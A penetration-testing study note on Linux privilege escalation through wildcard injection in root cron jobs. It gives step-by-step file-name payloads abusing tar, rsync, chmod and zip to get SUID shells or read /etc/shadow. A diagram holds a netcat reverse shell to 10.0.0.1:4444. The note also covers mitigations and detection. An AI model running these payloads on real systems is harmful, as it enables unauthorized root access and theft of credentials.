---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.22 Wildcard Injection"
---

# Wildcard Injection in Cron Jobs

## Introduction
Wildcard injection is a critical vulnerability that occurs when a system administrator uses the wildcard character `*` in command-line arguments without properly sanitizing input or validating the context of the files it expands to. This becomes exceptionally dangerous in automated administrative scripts, such as Cron jobs, which run as the `root` user. When a Cron job executes a command with a wildcard in a directory where an unprivileged user has write access, the unprivileged user can create files with names that are parsed as command-line flags or arguments by the vulnerable command.

This technique bridges the gap between insecure system administration practices and powerful privilege escalation paths. While modern tools often implement safe defaults, the legacy behavior of many Unix utilities parsing filenames as arguments continues to be a prevalent source of vulnerabilities.

## Mechanism of Wildcard Expansion (Globbing)
Before an executable is invoked by the shell, the shell performs a process called "globbing" or wildcard expansion. For example, when you run `tar -cf archive.tar *`, the `tar` command itself does not see the `*`. Instead, the shell expands `*` into an alphabetical list of all files in the current directory and passes them as arguments to `tar`.

If the directory contains three files: `file1.txt`, `file2.txt`, and `--help`, the shell expands the command to:
`tar -cf archive.tar --help file1.txt file2.txt`

The command `tar` then processes `--help` not as a file, but as an option flag. This behavioral nuance is the crux of Wildcard Injection.

### ASCII Diagram: Wildcard Injection Attack Flow

```text
+-------------------------------------------------------------------------+
|                          WILDCARD INJECTION FLOW                        |
+-------------------------------------------------------------------------+
|                                                                         |
|  1. Root Cron Job                 2. Target Directory (World-Writable)  |
|  +-----------------------+        +---------------------------------+   |
|  | * * * * * root        |        | /var/www/html/uploads/          |   |
|  | cd /var/www/html/...  |        | -rw-r--r-- file1.png            |   |
|  | && tar -cf backup.tar *|        | -rw-r--r-- file2.png            |   |
|  +-----------+-----------+        +-----------------^---------------+   |
|              |                                      |                   |
|              | (Execution triggers)                 |                   |
|              v                                      |                   |
|  3. Attacker Action (Unprivileged User)             |                   |
|  +--------------------------------------------------|---------------+   |
|  | $ echo "mkfifo /tmp/f; nc 10.0.0.1 4444 0</tmp/f | /bin/sh..."   |   |
|  | $ > "--checkpoint-action=exec=sh shell.sh"       |                   |
|  | $ > "--checkpoint=1"                             |                   |
|  +--------------------------------------------------+                   |
|              |                                                          |
|              v                                                          |
|  4. Shell Globbing Expansion (Runs as Root)                             |
|  +------------------------------------------------------------------+   |
|  | /bin/tar -cf backup.tar --checkpoint-action=exec=sh shell.sh \   |   |
|  |                         --checkpoint=1 file1.png file2.png       |   |
|  +------------------------------------------------------------------+   |
|              |                                                          |
|              v                                                          |
|  5. Execution via Vulnerable Binary (tar)                               |
|  +------------------------------------------------------------------+   |
|  | `tar` parses the flags, executes `shell.sh` during checkpointing |   |
|  | Root reverse shell spawned to 10.0.0.1:4444!                     |   |
|  +------------------------------------------------------------------+   |
+-------------------------------------------------------------------------+
```

## Vulnerable Binaries and Their Exploitation

Different binaries react differently to arguments passed via wildcard expansion. The most common binaries abused during Linux Privilege Escalation are `tar`, `rsync`, `chown`, and `chmod`.

### 1. `tar`
The `tar` utility is heavily used in Cron jobs for automated backups. GNU `tar` contains two specific arguments that allow for arbitrary command execution:
- `--checkpoint=1` : Displays a progress message every `N` records (in this case, 1).
- `--checkpoint-action=exec=COMMAND` : Executes the specified command at each checkpoint.

**Exploitation Steps:**
If a Cron job contains `tar -cf /backup/archive.tar *` in a world-writable directory (e.g., `/var/www/html/`):
1. Navigate to the target directory:
   `cd /var/www/html/`
2. Create the malicious payload script:
   `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh`
   `chmod +x shell.sh`
3. Create the deceptive files (using `touch` or `>`) that map to the `tar` flags:
   `touch "/var/www/html/--checkpoint=1"`
   `touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"`
4. Wait for the Cron job to execute. The shell expands the `*` and passes the malicious file names as flags. `tar` triggers the payload, providing a SUID bash binary in `/tmp`.

### 2. `rsync`
`rsync` is a file transfer program used for synchronization. It can be manipulated to execute arbitrary commands by leveraging the `-e` or `--rsh` flag, which specifies the remote shell to use.

**Exploitation Steps:**
Assume the Cron job is: `rsync -avz * user@remote:/backup/`
1. Navigate to the directory being synchronized.
2. Create the payload script:
   `echo 'chmod +s /bin/bash' > shell.sh`
   `chmod +x shell.sh`
3. Create the deceptive file to pass the `-e` argument:
   `touch "-e sh shell.sh"`
4. When `rsync` executes, it interprets the file as `-e sh shell.sh`, executing the shell script and changing the permissions of `/bin/bash` to SUID.

### 3. `chown` and `chmod`
While `chown` and `chmod` do not typically offer direct arbitrary command execution like `tar` or `rsync`, they can be used to read arbitrary files or change file permissions if a specific flag is passed.
The flag `--reference=FILE` sets the permissions/owner of the target file to match the reference file.

**Exploitation Scenario:**
Assume a script runs: `chmod 0644 *` in a directory.
1. You want to read `/etc/shadow`.
2. Create a symlink to the target file:
   `ln -s /etc/shadow file_to_read`
3. Create the reference flag:
   `touch -- "--reference=file_to_read"`
4. Wait for the script. The shell expands `*`, and `chmod` applies the permissions of `/etc/shadow` to the files. If the script processes symlinks or if you manipulate `chown` recursively, this can be chained to gain read or write access to protected system files.

## Detailed Defensive Posture and Mitigations

To defend against wildcard injection, system administrators must ensure that wildcards are either avoided entirely or that their outputs are securely sanitized.

### 1. Absolute Paths and Trailing Slashes
When specifying directories, using absolute paths minimizes risk. For example, instead of `tar -cf archive.tar *`, use `tar -cf archive.tar /path/to/dir/*`. While this doesn't fully solve the issue, it mitigates local expansion ambiguity.

### 2. The Double Dash `--` (End of Options)
The most robust defense is appending `--` before the wildcard. The `--` argument is an POSIX standard that indicates the end of command options. Anything following `--` is treated strictly as a file or positional argument, regardless of whether it begins with a hyphen.
**Secure implementation:**
`tar -cf /backup/archive.tar -- *`
`chown root:root -- *`

### 3. Using `find` instead of `*`
Replacing wildcards with `find` ensures that files are passed correctly and safely to binaries.
**Secure implementation:**
`find /var/www/html/ -type f -exec tar -rvf /backup/archive.tar {} +`

### 4. Application Sandboxing
Running Cron jobs with the principle of least privilege using restricted profiles (AppArmor, SELinux) or as an unprivileged user limits the blast radius if an injection vulnerability is present.

## Detection Mechanisms

Defenders and SIEM engineers can detect wildcard injection attempts by monitoring file creation events and command executions.

1. **Auditd Rules:**
   Monitor creation of files that begin with `--` in world-writable directories.
   ```bash
   auditctl -w /var/www/html -p wa -k web_dir_writes
   ```
   Analyzing the logs for suspicious filenames like `--checkpoint=1`.

2. **Process Monitoring:**
   Alert on processes spawned by Cron (`cron` -> `sh` -> `tar`) that launch interactive shells (`bash`, `sh`, `nc`, `python`) as child processes.

## Advanced Considerations and Chaining

Wildcard injection often serves as an initial foothold or a privilege escalation primitive. Its utility is heavily dependent on the environment.

### Bypassing Restricted Environments
In some constrained environments (like limited shells or containers), creating files with `-` might be filtered by the application handling file uploads. However, if the attacker has local shell access, `touch` allows bypassing parsing issues using the `--` standard.
`touch -- "--checkpoint=1"`
This ensures the `touch` command itself doesn't interpret `--checkpoint=1` as a flag.

### Exploiting Other Binaries
Beyond `tar` and `rsync`, look for internal or third-party binaries that process wildcard input. Tools like `zip` and `7z` have varying behaviors. `zip` requires `-T -TT 'command'` to execute commands, which can be injected similarly.
`touch -- "-T"`
`touch -- "-TT sh shell.sh"`

Always verify the binary's documentation (`man <binary>`) for flags that allow execution, file referencing, or reading.

## Summary Checklist for Penetration Testers
- [ ] Identify Cron jobs or automated scripts using `pspy` or reading `/etc/crontab`.
- [ ] Check if the script uses wildcards (`*`) without `--`.
- [ ] Determine the context: Is the wildcard expanding in a directory where the current user has write permissions?
- [ ] Read the manual page of the executing binary (`man tar`, `man rsync`) to find exploitable flags.
- [ ] Create the payload file and the deceptive flag files.
- [ ] Monitor the execution and catch the shell or verify the SUID bit.

## Chaining Opportunities
- Can be chained with [[06 - Cron Job Misconfigurations]] for general automated task exploitation.
- Can be leveraged alongside [[15 - SUID and SGID Binaries]] if the injected command modifies SUID binaries.
- Often requires finding world-writable directories, tying into [[10 - World Writable Files and Directories]].

## Related Notes
- [[04 - Enumerating Automated Tasks]]
- [[21 - Bash Script Weaknesses]]
- [[23 - Kernel Exploits]]
